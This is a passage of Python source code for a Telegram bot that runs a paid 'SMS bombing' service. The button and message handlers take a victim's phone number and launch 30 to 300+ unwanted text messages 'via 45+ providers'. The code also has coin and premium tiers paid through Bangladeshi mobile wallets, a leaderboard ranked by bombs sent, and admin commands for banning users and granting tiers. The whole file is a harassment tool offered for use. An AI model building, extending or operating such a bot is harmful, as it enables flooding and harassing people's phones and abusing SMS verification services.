# ===== BUTTON HANDLER =====

async def button_handler(update, context):
    q = update.callback_query
    await q.answer()
    uid = update.effective_user.id
    data = q.data
    username = f"@{update.effective_user.username}" if update.effective_user.username else "User"
    
    u = get_user(uid)
    if u.get("banned") and data not in ["back"]:
        await q.edit_message_text("🚫 You are banned!", reply_markup=main_menu())
        return
    
    if data == "back":
        await q.edit_message_text("🔙 **Main Menu**", reply_markup=main_menu(), parse_mode="Markdown")
    
    elif data == "claim_bonus":
        if can_claim_bonus(uid):
            new_balance = claim_bonus(uid)
            await q.edit_message_text(
                f"🎁 **Daily Bonus Claimed!** ✅\n\n"
                f"🪙 +10 coins added!\n"
                f"💰 Balance: {new_balance} coins\n\n"
                f"🔋 Send 1 Low SMS for {LOW_SMS_COST} coins (30+ SMS)!",
                parse_mode="Markdown", reply_markup=main_menu()
            )
        else:
            await q.edit_message_text(
                f"❌ **Already claimed today!**\n\n"
                f"Next: **{date.today() + timedelta(days=1)}**\n"
                f"🪙 Your coins: {u.get('coins', 0)}",
                parse_mode="Markdown", reply_markup=main_menu()
            )
    
    elif data == "send_bomb":
        await q.edit_message_text(
            "📱 **Send target phone number:**\n\nExample: `01712345678`",
            parse_mode="Markdown"
        )
        user_states[uid] = {"state": "number"}
    
    elif data == "my_profile":
        u = get_user(uid)
        tier = "🆓 Free" if u["tier"] == "free" else f"💎 Premium ({', '.join(u.get('paid_tiers',[]))})"
        bonus_status = "✅ Available" if can_claim_bonus(uid) else "❌ Claimed today"
        
        text = f"""
👤 **YOUR PROFILE**

━━━━━━━━━━━━━━━━━━━━━━

🆔 **ID:** `{uid}`
👤 **Username:** @{u.get('username', 'N/A')}
🎚 **Tier:** {tier}
🪙 **Coins:** {u.get('coins', 0)}
🎁 **Daily Bonus:** {bonus_status}
📦 **Total Bombs Sent:** {u.get('total_bombs', 0)}
🏆 **Total Coins Earned:** {u.get('total_coins_earned', 0)}
📅 **Joined:** {u.get('joined_date', 'N/A')}

━━━━━━━━━━━━━━━━━━━━━━
🤖 {BOT_MADE_BY}
        """
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
    
    elif data == "leaderboard":
        db = load_db()
        sorted_users = sorted(db.items(), key=lambda x: x[1].get('total_bombs', 0), reverse=True)
        
        text = "🏆 **LEADERBOARD** 🏆\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        rank = 1
        for uid2, udata in sorted_users[:10]:
            if udata.get('banned'):
                continue
            name = f"@{udata['username']}" if udata['username'] else udata['first_name']
            bombs = udata.get('total_bombs', 0)
            coins = udata.get('coins', 0)
            tier_icon = "💎" if udata['tier'] == 'paid' else "🆓"
            text += f"{rank}. {name} {tier_icon} — {bombs} bombs, {coins} coins\n"
            rank += 1
        
        if rank == 1:
            text += "No users yet! 🚀"
        
        text += "\n━━━━━━━━━━━━━━━━━━━━━━\nUse the bot and climb the ranks!"
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
    
    elif data == "users_list":
        db = load_db()
        total = len(db)
        paid = sum(1 for u2 in db.values() if u2.get("tier") == "paid")
        banned_count = sum(1 for u2 in db.values() if u2.get("banned"))
        active_today = sum(1 for u2 in db.values() if u2.get("last_bonus_claim") == str(date.today()))
        
        text = f"""
👥 **ALL USERS**

━━━━━━━━━━━━━━━━━━━━━━

📊 **Total:** {total}
💎 **Premium:** {paid}
🆓 **Free:** {total - paid - banned_count}
🚫 **Banned:** {banned_count}
🎁 **Active Today:** {active_today}

━━━━━━━━━━━━━━━━━━━━━━

**Recent Users:**
        """
        
        sorted_users = sorted(db.items(), key=lambda x: x[1].get('joined_date', ''), reverse=True)
        count = 0
        for uid2, udata in sorted_users[:15]:
            if udata.get('banned'):
                continue
            name = f"@{udata['username']}" if udata['username'] else udata['first_name']
            coins = udata.get('coins', 0)
            bombs = udata.get('total_bombs', 0)
            tier_icon = "💎" if udata['tier'] == 'paid' else "🆓"
            text += f"• {name} {tier_icon} — {coins}🪙, {bombs}💣\n"
            count += 1
        
        if count == 0:
            text += "No active users yet.\n"
        
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
    
    elif data == "premium":
        await q.edit_message_text(
            f"💎 **PREMIUM PLANS** 💎\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ **Medium** (3x loops = 90+ SMS) — **50 TK**\n"
            f"🔥 **High** (5x loops = 150+ SMS) — **100 TK**\n"
            f"💀 **Extreme** (10x loops = 300+ SMS) — **200 TK**\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔥 **COMBO:** All 3 = **300 TK** (Lifetime)\n\n"
            f"💳 bKash / Nagad / Rocket\n"
            f"📲 **Contact:** {ADMIN_USERNAME}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💎 Premium = UNLIMITED use, NO coins needed!\n"
            f"🆓 Free = 10 coins daily bonus",
            parse_mode="Markdown", reply_markup=main_menu()
        )
    
    elif data.startswith("bomb_"):
        level = data.split("_")[1]
        
        if uid not in user_states or "number" not in user_states.get(uid, {}):
            await q.edit_message_text("❌ No number set! Use /send", reply_markup=main_menu())
            return
        
        phone = user_states[uid]["number"]
        u = get_user(uid)
        
        loops = {"low": 1, "medium": 3, "high": 5, "extreme": 10}
        loop_count = loops.get(level, 1)
        
        sms_count = {"low": "30+", "medium": "90+", "high": "150+", "extreme": "300+"}
        
        if level == "low":
            if u["tier"] != "paid":
                if not has_enough_coins(uid, LOW_SMS_COST):
                    await q.edit_message_text(
                        f"❌ **Not enough coins!**\n\n"
                        f"🪙 You have: {u.get('coins', 0)} coins\n"
                        f"💰 Need: {LOW_SMS_COST} coins\n\n"
                        f"🎁 Claim daily bonus for 10 free coins!",
                        reply_markup=main_menu()
                    )
                    return
                spend_coins(uid, LOW_SMS_COST)
        else:
            if level not in u.get("paid_tiers", []):
                await q.edit_message_text(
                    f"❌ **{level.upper()} is Premium only!**\n\n"
                    f"💎 Buy: {ADMIN_USERNAME}",
                    reply_markup=main_menu()
                )
                return
        
        await q.edit_message_text(
            f"🚀 **Bombing Started!**\n\n"
            f"📱 Target: `{phone}`\n"
            f"⚡ Level: {level.upper()} ({sms_count.get(level, '30+')} SMS)\n"
            f"🔄 Loops: {loop_count}\n"
            f"👤 By: {username}\n\n"
            f"╔══════════════════════════════╗\n"
            f"║     📊 /status — Live Stats  ║\n"
            f"║     🛑 /stop — Stop          ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"⏳ Sending via 45+ providers...",
            parse_mode="Markdown"
        )
        
        def run_bomb():
            bomber = AhnafBomber()
            active_bombers[uid] = bomber
            stats = bomber.start(phone, loop_count)
            
            import asyncio
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            u_updated = get_user(uid)
            msg = f"""
✅ **Bombing Complete!**

📱 Target: `{phone}`
⚡ Level: {level.upper()}
━━━━━━━━━━━━━━━━━━━━━━
✅ **Sent:** {stats['sent']}
❌ **Failed:** {stats['failed']}
📦 **Total:** {stats['total']}

🪙 **Balance:** {u_updated.get('coins', 0)} coins
━━━━━━━━━━━━━━━━━━━━━━
            """
            if u["tier"] != "paid":
                msg += "🎁 Claim daily bonus for more coins!\n"
            msg += f"\n🔙 /start for main menu\n🤖 {BOT_MADE_BY}"
            
            loop.run_until_complete(
                context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=msg,
                    parse_mode="Markdown",
                    reply_markup=main_menu()
                )
            )
            loop.close()
            active_bombers[uid] = None
        
        t = threading.Thread(target=run_bomb, daemon=True)
        t.start()
    
    # ===== ADMIN =====
    elif data.startswith("admin_"):
        if not is_admin(uid):
            return
        action = data.split("_")[1]
        
        if action == "stats":
            db = load_db()
            total = len(db)
            paid = sum(1 for u2 in db.values() if u2.get("tier") == "paid")
            banned_count = sum(1 for u2 in db.values() if u2.get("banned"))
            active_today = sum(1 for u2 in db.values() if u2.get("last_bonus_claim") == str(date.today()))
            total_coins = sum(u2.get("coins", 0) for u2 in db.values())
            total_bombs = sum(u2.get("total_bombs", 0) for u2 in db.values())
            
            await q.edit_message_text(
                f"📊 **BOT STATS**\n"
                f"━━━━━━━━━━━━━\n"
                f"👥 Total: {total}\n"
                f"💎 Premium: {paid}\n"
                f"🆓 Free: {total-paid-banned_count}\n"
                f"🚫 Banned: {banned_count}\n"
                f"🎁 Active Today: {active_today}\n"
                f"🪙 Total Coins: {total_coins}\n"
                f"📦 Total Bombs: {total_bombs}\n"
                f"━━━━━━━━━━━━━\n"
                f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode="Markdown", reply_markup=admin_menu()
            )
        
        elif action == "users":
            db = load_db()
            text = "👥 **ALL USERS:**\n\n"
            for uid2, udata in sorted(db.items(), key=lambda x: x[1].get('joined_date',''), reverse=True)[:30]:
                name = f"@{udata['username']}" if udata['username'] else udata['first_name']
                coins = udata.get('coins', 0)
                bombs = udata.get('total_bombs', 0)
                tier_icon = "💎" if udata['tier'] == 'paid' else "🆓"
                ban = "🚫" if udata.get('banned') else ""
                text += f"`{str(uid2)[:6]}..` {name} {tier_icon}{ban} ({coins}🪙/{bombs}💣)\n"
            text += f"\n**Total: {len(db)} users**"
            await q.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_menu())
        
        elif action in ["add", "remove", "ban", "unban", "broadcast"]:
            cmds = {
                "add": "➕ `/add @username tier`\nTiers: medium, high, extreme",
                "remove": "➖ `/remove @username` or `/remove @username tier`",
                "ban": "⛔ `/ban @username`",
                "unban": "✅ `/unban @username`",
                "broadcast": "📢 `/broadcast Your message`"
            }
            await q.edit_message_text(cmds.get(action, ""), parse_mode="Markdown", reply_markup=admin_menu())

# ===== MESSAGE HANDLER =====

async def msg_handler(update, context):
    uid = update.effective_user.id
    text = update.message.text.strip()
    
    u = get_user(uid)
    if u.get("banned"):
        await update.message.reply_text("🚫 You are banned!")
        return
    
    if uid in user_states and user_states[uid].get("state") == "number":
        digits = "".join(filter(str.isdigit, text))
        if len(digits) < 10:
            await update.message.reply_text("❌ Invalid! Example: `01712345678`", parse_mode="Markdown")
            return
        
        user_states[uid]["number"] = digits
        user_states[uid]["state"] = ""
        
        u_current = get_user(uid)
        coins = u_current.get('coins', 0)
        
        await update.message.reply_text(
            f"✅ **Number Set:** `{digits}`\n\n"
            f"🪙 Your coins: {coins} | 🔋 Low = {LOW_SMS_COST} coins\n"
            f"💎 Premium = FREE, unlimited use\n\n"
            f"╔══════════════════════════╗\n"
            f"║  🔋 Low → 30+ SMS       ║\n"
            f"║  ⚡ Medium → 90+ SMS 💎 ║\n"
            f"║  🔥 High → 150+ SMS 💎 ║\n"
            f"║  💀 Extreme → 300+ SMS💎║\n"
            f"╚══════════════════════════╝\n\n"
            f"Choose intensity below:",
            reply_markup=bomb_menu(), parse_mode="Markdown"
        )

# ===== ADMIN COMMANDS =====

async def admin_panel(update, context):
    if not is_admin(update.effective_user.id):
        return
    await update.message.reply_text("👑 **Admin Panel**", reply_markup=admin_menu(), parse_mode="Markdown")

async def add_cmd(update, context):
    if not is_admin(update.effective_user.id):
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: `/add @username tier`\nTiers: medium, high, extreme", parse_mode="Markdown")
        return
    target = args[0].replace("@","").lower()
    tier = args[1].lower()
    if tier not in ["medium","high","extreme"]:
        await update.message.reply_text("❌ Invalid tier! Use: medium, high, extreme")
        return
    for uid2, udata in load_db().items():
        if udata.get("username","").lower() == target:
            add_paid_tier(uid2, tier)
            await update.message.reply_text(f"✅ **{tier.upper()}** → @{target}")
            try:
                await context.bot.send_message(int(uid2), f"🎉 **{tier.upper()} Premium Activated!**\nUnlimited SMS bombing now! 🤖", parse_mode="Markdown")
            except:
                pass
            return
    await update.message.reply_text(f"❌ @{target} not found. They need to /start first.")

async def remove_cmd(update, context):
    if not is_admin(update.effective_user.id):
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/remove @username` or `/remove @username tier`", parse_mode="Markdown")
        return
    target = args[0].replace("@","").lower()
    tier = args[1].lower() if len(args) > 1 else None
    for uid2, udata in load_db().items():
        if udata.get("username","").lower() == target:
            remove_paid_tier(uid2, tier)
            await update.message.reply_text(f"✅ Removed @{target}")
            return
    await update.message.reply_text(f"❌ @{target} not found.")

async def ban_cmd(update, context):
    if not is_admin(update.effective_user.id):
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/ban @username`", parse_mode="Markdown")
        return
    target = args[0].replace("@","").lower()
    for uid2, udata in load_db().items():
        if udata.get("username","").lower() == target:
            update_user(uid2, {"banned": True})
            await update.message.reply_text(f"✅ Banned @{target}")
            try:
                await context.bot.send_message(int(uid2), "🚫 **You have been banned!** Contact admin.")
            except:
                pass
            return
    await update.message.reply_text(f"❌ @{target} not found.")

async def unban_cmd(update, context):
    if not is_admin(update.effective_user.id):
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/unban @username`", parse_mode="Markdown")
        return
    target = args[0].replace("@","").lower()
    for uid2, udata in load_db().items():
        if udata.get("username","").lower() == target:
            update_user(uid2, {"banned": False})
            await update.message.reply_text(f"✅ Unbanned @{target}")
            try:
                await context.bot.send_message(int(uid2), "✅ **Unbanned!** Welcome back!")
            except:
                pass
            return
    await update.message.reply_text(f"❌ @{target} not found.")

async def broadcast_cmd(update, context):
    if not is_admin(update.effective_user.id):
        return
    msg = " ".join(context.args)
    if not msg:
        await update.message.reply_text("Usage: `/broadcast Your message`", parse_mode="Markdown")
        return
    sent = failed = 0
    for uid2 in load_db():
        try:
            await context.bot.send_message(int(uid2), f"📢 **Announcement**\n\n{msg}\n\n— {ADMIN_USERNAME} | {BOT_MADE_BY}", parse_mode="Markdown")
            sent += 1
        except:
            failed += 1
    await update.message.reply_text(f"📢 Broadcast: ✅ {sent} sent, ❌ {failed} failed")

async def stats_cmd(update, context):
    if not is_admin(update.effective_user.id):
        return
    db = load_db()
    total = len(db)
    paid = sum(1 for u2 in db.values() if u2.get("tier") == "paid")
    banned_count = sum(1 for u2 in db.values() if u2.get("banned"))
    active_today = sum(1 for u2 in db.values() if u2.get("last_bonus_claim") == str(date.today()))
    await update.message.reply_text(
        f"📊 **STATS**\n👥 {total} | 💎 {paid} | 🆓 {total-paid-banned_count} | 🚫 {banned_count} | 🎁 {active_today}",
        parse_mode="Markdown"
    )

